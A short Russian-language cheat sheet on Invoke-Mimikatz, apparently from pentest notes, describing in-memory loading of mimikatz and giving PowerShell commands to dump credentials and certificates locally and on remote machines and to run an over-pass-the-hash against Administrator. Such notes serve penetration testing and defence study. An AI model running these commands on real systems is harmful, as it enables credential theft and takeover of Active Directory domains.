# Invoke-Mimikatz

Скрипт используется для сбора кредсов, тикетов и др фишек mimikatz с помощью PowerShell, но без установки бинаря на диск

Скрипт очень сильно помогает для passes и replaing хешей, тикетов и др атак на AD

Используя код из `ReflectivePEInjection` (часть `PowerSploit`), mimikatz загружается в память. Все функции mimikatz могут быть использованы из этого скрипта.

Вот этот работает: [https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1)

Примеры использования:

```powershell
# Сбор кредов на локальной машине
Invoke-Mimikatz -DumpCreds

# Сбор сертов на локальной машине
Invoke-Mimikatz –DumpCerts

# Сбор кредов на нескольких удаленных машинах
Invoke-Mimikatz -DumpCreds -ComputerName @("machine1", "machine2")
# При этом Invoke-Mimikatz использует Invoke-Command на удаленной тачке. 
# Таким образом, требуются креды или административный доступ к удаленной машине.

# Пример генерации токенов из NTLM-хеша (Over-Pass-The-Hash)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:target /ntlm:23fd2..d34 /run:powershell.exe"'

```
